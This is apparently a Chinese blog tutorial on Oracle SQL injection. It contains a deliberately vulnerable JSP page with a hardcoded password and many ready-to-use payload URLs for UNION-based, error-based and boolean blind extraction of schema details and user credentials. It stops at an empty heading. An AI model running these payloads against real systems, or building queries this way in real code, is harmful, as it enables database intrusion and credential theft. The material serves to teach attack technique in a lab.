<h3 id="PL-SQL语言"><a href="#PL-SQL语言" class="headerlink" title="PL/SQL语言"></a>PL/SQL语言</h3><p>PL/SQL也是一种程序语言，叫做过程化SQL语言（Procedual Language/SQL）。</p>
<p>PL/SQL是Oracle数据库对SQL语句的扩展。在普通SQL语句的使用上增加了编程语言的特点，所以PL/SQL就是把数据操作和查询语句组织在PL/SQL代码的过程性单元中，通过逻辑判断、循环等操作实现复杂的功能或者计算的程序语言。 在PL/SQL编程语言是由甲骨文公司在20世纪80年代，作为SQL程序扩展语言和Oracle关系数据库开发。</p>
<p>基本存储过程结构：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">    &lt;declarations section&gt;</span><br><span class="line">BEGIN</span><br><span class="line">    &lt;executable command(s)&gt;</span><br><span class="line">EXCEPTION</span><br><span class="line">    &lt;exception handing&gt;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入需注意的规则"><a href="#SQL注入需注意的规则" class="headerlink" title="SQL注入需注意的规则"></a>SQL注入需注意的规则</h3><ol>
<li> Oracle使用查询语言获取需要跟上表名，这一点和Access类似，没有表的情况下可以使用dual表，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录。</li>
<li> Oracle的数据库类型是强匹配，所以在Oracle进行类似Union查询数据时必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用NULL代替某些无法快速猜测出的数据类型位置，这一点和SQLServer类似。</li>
<li> Oracle和mysql不一样，分页中没有limit，而是使用三层查询嵌套的方式实现分页 例如: <code>SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM &lt;= 1 ) WHERE RN &gt;=0</code></li>
<li> Oracle的单行注释符号是<code>--</code>，多行注释符号<code>/**/</code>。</li>
<li> Oracle 数据库包含了几个系统表，这几个系统表里存储了系统数据库的表名和列名，如user_tab_columns，all_tab_columns，all_tables，user_tables 系统表就存储了用户的所有的表、列名，其中table_name 表示的是系统里的表名，column_name 里的是系统里存在的列名。</li>
<li> Oracle使用<code>||</code>拼接字符串（在URL中使用编码<code>%7c</code>表示），<code>concat()</code>函数也可以实现两个字符串的拼接</li>
</ol>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li>操作系统：Windows Server 2008R2</li>
<li>数据库：Microsoft SQL Server 2008R2</li>
<li>Web服务器：Tomcat 7.0</li>
<li>脚本语言：jsp</li>
<li>源代码：index.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span>  pageEncoding=<span class="string">&quot;utf-8&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;oracle.jdbc.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.sql.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;oracle.sql.*&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">String path = request.getContextPath();</span><br><span class="line">String basePath = request.getScheme()+<span class="string">&quot;://&quot;</span>+request.getServerName()+<span class="string">&quot;:&quot;</span>+request.getServerPort()+path+<span class="string">&quot;/&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;base href=<span class="string">&quot;&lt;%=basePath%&gt;&quot;</span>&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;title&gt;Oracle注入测试&lt;/title&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;pragma&quot;</span> content=<span class="string">&quot;no-cache&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;cache-control&quot;</span> content=<span class="string">&quot;no-cache&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;expires&quot;</span> content=<span class="string">&quot;0&quot;</span>&gt;    </span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;keywords&quot;</span> content=<span class="string">&quot;keyword1,keyword2,keyword3&quot;</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;description&quot;</span> content=<span class="string">&quot;This is my page&quot;</span>&gt;</span><br><span class="line">        &lt;!--</span><br><span class="line">        &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;styles.css&quot;</span> mce_href=<span class="string">&quot;styles.css&quot;</span>&gt;</span><br><span class="line">        --&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;body&gt; </span><br><span class="line">    &lt;%</span><br><span class="line">        String  url  =  <span class="string">&quot;http://&quot;</span>  +  request.getServerName()  +  <span class="string">&quot;:&quot;</span>  +  request.getServerPort()  +  request.getContextPath()+request.getServletPath();</span><br><span class="line">            Class.forName(<span class="string">&quot;oracle.jdbc.driver.OracleDriver&quot;</span>).newInstance();</span><br><span class="line">            Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">            ResultSet rs=<span class="keyword">null</span>;</span><br><span class="line">            String oraUrl=<span class="string">&quot;jdbc:oracle:thin:@127.0.0.1:1521:orcl&quot;</span>;</span><br><span class="line">            String oraUser=<span class="string">&quot;TEST&quot;</span>;</span><br><span class="line">            String oraPWD=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                    DriverManager.registerDriver(<span class="keyword">new</span> oracle.jdbc.driver.OracleDriver());</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)</span><br><span class="line">            &#123;</span><br><span class="line">                out.print(<span class="string">&quot;filed!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                Connection conn=DriverManager.getConnection(oraUrl,oraUser,oraPWD);</span><br><span class="line">                String sql=<span class="string">&quot;select * from news where id=&quot;</span>+request.getParameter(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;执行语句:&lt;br&gt;&quot;</span>+sql+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">                stmt = conn.createStatement();</span><br><span class="line">                rs = stmt.executeQuery(sql);</span><br><span class="line">                out.print(<span class="string">&quot;结果为:&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;table border=&#x27;1&#x27; cellpadding=&#x27;4&#x27; cellspacing=&#x27;0&#x27; style=&#x27;background-color:White;border-color:#3366CC;border-width:1px;border-style:None;width:203px;border-collapse:collapse;&#x27;&gt;&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;tr style=&#x27;color:#CCCCFF;background-color:#003399;font-weight:bold;&#x27;&gt;&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;td&gt;id&lt;/td&gt;&lt;td&gt;title&lt;/td&gt;&lt;td&gt;content&lt;/td&gt;&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">                out.print(<span class="string">&quot;&lt;tr style=&#x27;color:#003399;background-color:White;&#x27;&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">while</span>(rs.next())</span><br><span class="line">                &#123;</span><br><span class="line">                        out.print(<span class="string">&quot;&lt;td&gt;&quot;</span>);out.print(rs.getString(<span class="number">1</span>));out.print(<span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                        out.print(<span class="string">&quot;&lt;td&gt;&quot;</span>);out.print(rs.getString(<span class="number">2</span>));out.print(<span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                        out.print(<span class="string">&quot;&lt;td&gt;&quot;</span>);out.print(rs.getString(<span class="number">3</span>));out.print(<span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                out.print(<span class="string">&quot;&lt;tr&gt;&quot;</span>);</span><br><span class="line">                rs.close();</span><br><span class="line">                stmt.close();</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e)</span><br><span class="line">            &#123;</span><br><span class="line">                    System.out.println(e.toString());</span><br><span class="line">                    out.print(e.toString());</span><br><span class="line">            &#125;</span><br><span class="line">     %&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>判断注入点的方式与之前的数据库注入一样，就不详细讲了。</p>
<h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><p>依旧提交order by 去猜测显示当前页面所用的SQL查询了多少个字段，也就是确认查询字段数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 order by 3 --+</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 order by 4 --+</span><br></pre></td></tr></table></figure>

<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select null,null,null from dual --+</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,&#x27;2&#x27;,&#x27;3&#x27; from dual --+</span><br></pre></td></tr></table></figure>

<h3 id="获取数据库基本信息"><a href="#获取数据库基本信息" class="headerlink" title="获取数据库基本信息"></a>获取数据库基本信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取数据库版本</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select banner from sys.v_$version where rownum=1 ),&#x27;3&#x27; from dual --+		</span><br><span class="line"></span><br><span class="line">获取数据库的实例名(SYS用户才可查询)</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select instance_name from v_$instance),&#x27;3&#x27; from dual --+	</span><br></pre></td></tr></table></figure>

<h3 id="获取用户名"><a href="#获取用户名" class="headerlink" title="获取用户名"></a>获取用户名</h3><p>Oracle没有数据库名的概念，所谓数据库名，即数据表的拥有者，也就是用户名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取第一个用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select username from all_users where rownum=1),&#x27;3&#x27; from dual --+	</span><br><span class="line"></span><br><span class="line">获取第二个用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select username from all_users where rownum=1 and username&lt;&gt;&#x27;SYS&#x27;),&#x27;3&#x27; from dual --+	</span><br><span class="line"></span><br><span class="line">获取当前用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(SELECT user FROM dual),&#x27;3&#x27; from dual --+</span><br></pre></td></tr></table></figure>

<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取TEST用户的第一张表</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;),&#x27;3&#x27; from dual --+</span><br><span class="line"></span><br><span class="line">获取TEST用户的第二张表</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27; and table_name&lt;&gt;&#x27;NEWS&#x27;),&#x27;3&#x27; from dual --+</span><br></pre></td></tr></table></figure>

<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取TEST用户的USERS表的第一个列名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1),&#x27;3&#x27; from dual --+	</span><br><span class="line"></span><br><span class="line">获取TEST用户的USERS表的第二个列名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1 and column_name&lt;&gt;&#x27;ID&#x27;),&#x27;3&#x27; from dual --+	</span><br></pre></td></tr></table></figure>

<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=-1 union select 1,(select concat(concat(username,&#x27;~~&#x27;),password) from users where rownum=1),null from dual --+	</span><br></pre></td></tr></table></figure>

<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在oracle注入时候出现了数据库报错信息，可以优先选择报错注入，使用报错的方式将查询数据的结果带出到错误页面中。</p>
<p>使用报错注入需要使用类似 1=[报错语句]，1&gt;[报错语句]，使用比较运算符，这样的方式进行报错注入（MYSQL仅使用函数报错即可），类似mssql报错注入的方式。</p>
<h3 id="utl-inaddr-get-host-name-函数报错注入"><a href="#utl-inaddr-get-host-name-函数报错注入" class="headerlink" title="utl_inaddr.get_host_name()函数报错注入"></a>utl_inaddr.get_host_name()函数报错注入</h3><p><code>utl_inaddr.get_host_address</code> 本意是获取ip 地址，但是如果传递参数无法得到解析就会返回一个oracle 错误并显示传递的参数。</p>
<p>我们传递的是一个sql 语句所以返回的就是语句执行的结果。oracle 在启动之后，把一些系统变量都放置到一些特定的视图当中，可以利用这些视图获得想要的东西。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=utl_inaddr.get_host_name(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) --+</span><br></pre></td></tr></table></figure>

<h3 id="ctxsys-drithsx-sn-函数报错注入"><a href="#ctxsys-drithsx-sn-函数报错注入" class="headerlink" title="ctxsys.drithsx.sn()函数报错注入"></a>ctxsys.drithsx.sn()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=ctxsys.drithsx.sn(1,&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) --+</span><br></pre></td></tr></table></figure>

<h3 id="dbms-xdb-version-checkin-函数报错注入"><a href="#dbms-xdb-version-checkin-函数报错注入" class="headerlink" title="dbms_xdb_version.checkin()函数报错注入"></a>dbms_xdb_version.checkin()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.checkin(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>

<h3 id="dbms-xdb-version-makeversioned-函数报错注入"><a href="#dbms-xdb-version-makeversioned-函数报错注入" class="headerlink" title="dbms_xdb_version.makeversioned()函数报错注入"></a>dbms_xdb_version.makeversioned()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.makeversioned(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>

<h3 id="dbms-xdb-version-uncheckout-函数报错注入"><a href="#dbms-xdb-version-uncheckout-函数报错注入" class="headerlink" title="dbms_xdb_version.uncheckout()函数报错注入"></a>dbms_xdb_version.uncheckout()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_xdb_version.uncheckout(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>

<h3 id="dbms-utility-sqlid-to-sqlhash-函数报错注入"><a href="#dbms-utility-sqlid-to-sqlhash-函数报错注入" class="headerlink" title="dbms_utility.sqlid_to_sqlhash()函数报错注入"></a>dbms_utility.sqlid_to_sqlhash()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select dbms_utility.sqlid_to_sqlhash(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>

<h3 id="ordsys-ord-dicom-getmappingxpath-函数报错注入"><a href="#ordsys-ord-dicom-getmappingxpath-函数报错注入" class="headerlink" title="ordsys.ord_dicom.getmappingxpath()函数报错注入"></a>ordsys.ord_dicom.getmappingxpath()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;%7c%7c(select user from dual)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select ordsys.ord_dicom.getmappingxpath(&#x27;~&#x27;%7c%7c(select username from test.users where rownum=1)%7c%7c&#x27;~&#x27;) from dual) is not null --+</span><br></pre></td></tr></table></figure>

<h3 id="XMLType-函数报错注入"><a href="#XMLType-函数报错注入" class="headerlink" title="XMLType()函数报错注入"></a>XMLType()函数报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取用户名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select user from dual)%7c%7cchr(62))) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;)%7c%7cchr(62))) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取字段名</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1)%7c%7cchr(62))) from dual) is not null --+</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select upper(XMLType(chr(60)%7c%7cchr(58)%7c%7c(select username from test.users where rownum=1)%7c%7cchr(62))) from dual) is not null --+</span><br></pre></td></tr></table></figure>

<h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><h3 id="decode-函数布尔盲注"><a href="#decode-函数布尔盲注" class="headerlink" title="decode()函数布尔盲注"></a>decode()函数布尔盲注</h3><p><code>decode(字段或字段的运算，值1，值2，值3）</code></p>
<p>这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3。</p>
<p>当然值1，值2，值3也可以是表达式，这个函数使得某些sql语句简单了许多。</p>
<p>使用方法：</p>
<p>比较大小</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select decode(sign(变量1-变量2),-1,变量1,变量2) from dual; --取较小值</span><br></pre></td></tr></table></figure>

<p>sign()函数根据某个值是0、正数还是负数，分别返回0、1、-1</p>
<p>例如：</p>
<p>变量1=10，变量2=20，则<code>sign(变量1-变量2)</code>返回-1，decode解码结果为“变量1”，达到了取较小值的目的。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> decode(sign(<span class="number">10</span><span class="number">-20</span>),<span class="number">-1</span>,<span class="number">10</span>,<span class="number">20</span>) <span class="keyword">from</span> dual;                   </span><br></pre></td></tr></table></figure>



<p><strong>猜解当前用户</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断是否是TEST用户</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(user,&#x27;TEST&#x27;,1,0) from dual) --+</span><br><span class="line"></span><br><span class="line">也可利用substr()函数进行逐一猜解</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;),1,1),&#x27;T&#x27;,1,0) from dual) --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select table_name from all_tables where rownum=1 and owner=&#x27;TEST&#x27;),1,1),&#x27;N&#x27;,1,0) from dual) --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select column_name from all_tab_columns where owner=&#x27;TEST&#x27; and table_name=&#x27;USERS&#x27; and rownum=1),1,1),&#x27;I&#x27;,1,0) from dual) --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and 1=(select decode(substr((select username from test.users where rownum=1),1,1),&#x27;a&#x27;,1,0) from dual) --+</span><br></pre></td></tr></table></figure>

<h3 id="instr-函数布尔盲注"><a href="#instr-函数布尔盲注" class="headerlink" title="instr()函数布尔盲注"></a>instr()函数布尔盲注</h3><p>instr函数的使用，从一个字符串中查找指定子串的位置。例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> instr(<span class="string">&#x27;abcdef123de&#x27;</span>,<span class="string">&#x27;de&#x27;</span>) position <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061056394.png" alt="043da52fbdd3d786b78a7384caa9c6c7.png"></p>
<p>从1开始算 de排第四所以返回4</p>
<p><strong>布尔盲注中的应用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and (instr((select user from dual),&#x27;S&#x27;))=1 --+</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (instr((select user from dual),&#x27;SY&#x27;))=1 --+</span><br><span class="line">http://hackrock.com:8080/oracle/?id=1 and (instr((select user from dual),&#x27;SYS&#x27;))=1 --+</span><br></pre></td></tr></table></figure>

<p>payload构造如上。</p>
<h3 id="substr-函数布尔盲注"><a href="#substr-函数布尔盲注" class="headerlink" title="substr()函数布尔盲注"></a>substr()函数布尔盲注</h3><p><strong>获取数据长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8080/oracle/?id=1 and (select length(user) from dual)=3 --+</span><br></pre></td></tr></table></figure>

<p><strong>猜解ASCII码</strong></p>
